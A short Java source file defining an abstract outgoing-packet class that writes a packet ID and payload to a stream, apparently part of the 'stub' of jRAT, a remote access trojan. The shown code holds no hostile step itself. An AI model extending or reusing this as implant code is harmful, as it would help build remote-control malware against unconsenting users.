package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public abstract class AbstractOutgoingPacket {

	public abstract void write(DataOutputStream dos, StringWriter sw) throws Exception;

	public abstract byte getPacketId();

	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
		try {
			dos.writeShort(getPacketId());
			this.write(dos, sw);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
